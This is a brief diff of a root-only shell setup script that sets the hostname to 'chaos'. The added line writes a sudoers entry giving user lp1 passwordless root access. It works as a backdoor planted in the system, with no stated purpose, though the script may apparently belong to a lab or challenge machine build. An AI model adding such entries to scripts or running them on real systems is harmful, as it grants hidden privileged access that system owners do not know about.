@@ -6,3 +6,4 @@ if [ "$EUID" -ne 0 ];then
   exit
 fi
 echo "chaos" >> /etc/hostname
+echo "lp1 ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
